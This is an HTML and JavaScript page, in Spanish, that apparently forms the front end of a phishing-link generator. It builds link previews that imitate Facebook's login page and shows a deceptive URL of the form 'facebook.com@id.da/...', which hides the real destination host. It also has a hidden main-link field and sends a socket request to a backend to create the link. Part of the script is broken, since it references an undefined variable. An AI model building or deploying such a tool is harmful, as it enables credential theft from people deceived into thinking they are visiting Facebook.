<style>
    @media (min-width: 719px) {
        .columna\:grid-cols-2 {
            grid-template-columns: repeat(2, minmax(0, 1fr));
        }
    }

    @media (max-width: 1340px) {
        .vista\:columna {
            grid-template-columns: repeat(1, minmax(0, 1fr));
        }
    }
</style>
<section class="p-4 bg-gray-900 text-white rounded-lg shadow-lg w-full">
    <h2 class="text-3xl font-bold mb-4">Crea un enlace personalizado de Facebook</h2>
    <p class="mb-4 text-gray-400">Personaliza tu enlace agregando una imagen, título, descripción y un segundo enlace
        opcional.</p>

    <div class="grid grid-cols-1 columna:grid-cols-2 gap-6">
        <!-- Columna Izquierda: Formulario -->
        <form id="form-enlace" class="space-y-4">
            <!-- Input de Imagen (Opcional) -->
            <div>
                <label for="imagen" class="block text-sm font-medium text-gray-300">Imagen (Opcional)

                    <button id="eliminar-imagen" type="button" style="display: none;" class="bg-red-500 mx-2 px-1 py-1 rounded-md">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                            class="bi bi-x-circle" viewBox="0 0 16 16">
                            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16" />
                            <path
                                d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708" />
                        </svg>
                    </button></label>

                <input type="file" id="imagen" accept="image/*"
                    class="w-full p-2 bg-gray-800 text-white rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
            </div>


            <!-- Título (Opcional) -->
            <div>
                <label for="titulo" class="block text-sm font-medium text-gray-300">Título (Opcional)</label>
                <input type="text" id="titulo" placeholder="Escribe un título..."
                    class="w-full p-2 bg-gray-800 text-white rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
            </div>

            <!-- Descripción (Opcional) -->
            <div>
                <label for="descripcion" class="block text-sm font-medium text-gray-300">Descripción (Opcional)</label>
                <textarea id="descripcion" placeholder="Añade una descripción..." rows="3"
                    class="w-full p-2 bg-gray-800 text-white rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
            </div>

            <!-- Enlace Principal (Obligatorio) -->
            <div style="display: none;">
                <label for="enlace1" class="block text-sm font-medium text-gray-300">Enlace Principal</label>
                <input type="url" id="enlace1" placeholder="https://facebook.com/tu-enlace"
                    class="w-full p-2 bg-gray-800 text-white rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                    >
            </div>

            <!-- Enlace Secundario (Opcional) -->
            <div>
                <label for="enlace2" class="block text-sm font-medium text-gray-300">Enlace Secundario
                    (Opcional)</label>
                <input type="url" id="enlace2" placeholder="https://facebook.com/otro-enlace"
                    class="w-full p-2 bg-gray-800 text-white rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
            </div>

            <!-- Botón de Enviar -->
            <button type="submit"
                class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold p-2 rounded-md transition">
                Generar Enlace
            </button>
        </form>

        <!-- Columna Derecha: Vista Previa -->
        <div id="vista-previa" class="p-4 bg-gray-800 rounded-lg shadow-lg space-y-3">
            <h1 class="text-2xl font-bold mb-4">Vista previa del enlace</h1>
            <div
                class="grid grid-cols-1 vista:columna md:grid-cols-[20%,1fr] gap-4 bg-white p-4 rounded-lg shadow-md items-center">
                <!-- Imagen (pequeña como icono) -->
                <div class="w-full h-[150px] rounded-md overflow-hidden flex items-center justify-center bg-gray-100">
                    <img id="preview-imagen"
                        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQnULcBfSqH9C3ooVVkPDA9rxRyqHoR3M1ng&s"
                        alt="Vista previa de imagen" class="object-cover" style="width: fit-content !important;">
                </div>


                <!-- Detalles -->
                <div class="flex flex-col justify-center">
                    <p id="preview-titulo" class="text-sm sm:text-lg md:text-xl font-bold text-gray-900">
                        Facebook - Inicia sesión o regístrate
                    </p>

                    <p id="preview-descripcion"
                        class="text-xs sm:text-sm text-gray-600 w-full max-w-full overflow-hidden text-ellipsis whitespace-normal line-clamp-1">
                        Inicia sesión en Facebook para empezar a compartir y conectar con tus amigos, familiares y las
                        personas que conoces.
                    </p>

                    <p id="preview-enlace-texto"
                        class="text-xs sm:text-sm text-gray-500 break-words text-ellipsis whitespace-normal line-clamp-1">
                        https://facebook.com@id.da/dfgdfgsfdg
                    </p>

                </div>
            </div>
            <br><br>

            <h1 class="text-xl font-bold mb-4">Enlace de redirecionamiento</h1>

            <a id="preview-enlace" href="https://www.facebook.com/"
                class="text-blue-500 hover:underline text-sm sm:text-base break-words">
                https://www.facebook.com/
            </a>


        </div>
    </div>
</section>

<script>
    const socket = io();

    const form = document.getElementById("form-enlace");
    const vistaPrevia = document.getElementById("vista-previa");
    const inputImagen = document.getElementById("imagen");
    const inputTitulo = document.getElementById("titulo");
    const inputDescripcion = document.getElementById("descripcion");
    const eliminarImagenBtn = document.getElementById("eliminar-imagen");
    // const inputEnlace1 = document.getElementById("enlace1");
    const inputEnlace1 = document.getElementById("enlace2");

    const previewImagen = document.getElementById("preview-imagen");
    const previewTitulo = document.getElementById("preview-titulo");
    const previewDescripcion = document.getElementById("preview-descripcion");
    const previewEnlace = document.getElementById("preview-enlace");

    eliminarImagenBtn.addEventListener("click", () => {
        inputImagen.value = ""; // Reinicia el input
        previewImagen.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQnULcBfSqH9C3ooVVkPDA9rxRyqHoR3M1ng&s";
        eliminarImagenBtn.style.display = 'none'

    });

    window.actualizarVistaPrevia = function () {
        const titulo = inputTitulo.value.trim();
        const descripcion = inputDescripcion.value.trim();
        const enlace = inputEnlace1.value.trim();

        // Mostrar vista previa solo si hay un enlace principal
        previewTitulo.textContent = titulo || "Facebook - Inicia sesión o regístrate";
        previewDescripcion.textContent = descripcion || "Inicia sesión en Facebook para empezar a compartir y conectar con tus amigos, familiares y laspersonas que conoces.";
        previewEnlace.textContent = enlace || "https://www.facebook.com/";

    }

    // Cargar imagen de vista previa
    inputImagen.addEventListener("change", function () {
        const file = this.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function (e) {
                eliminarImagenBtn.style.display = 'inline'

                previewImagen.src = e.target.result;
            };
            reader.readAsDataURL(file);
        } else {
            eliminarImagenBtn.style.display = 'none'
            previewImagen.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQnULcBfSqH9C3ooVVkPDA9rxRyqHoR3M1ng&s";
        }
    });

    // Actualizar vista previa en tiempo real
    inputTitulo.addEventListener("input", actualizarVistaPrevia);
    inputDescripcion.addEventListener("input", actualizarVistaPrevia);
    inputEnlace1.addEventListener("input", actualizarVistaPrevia);

    // Manejar envío del formulario
    function crearEnlace(tipo) {
        socket.emit("crearEnlace", { tipo: tipo, id: file });
    }

    
    form.addEventListener("submit", function (event) {
        event.preventDefault();
        actualizarVistaPrevia();
        crearEnlace('facebook')

    });



</script>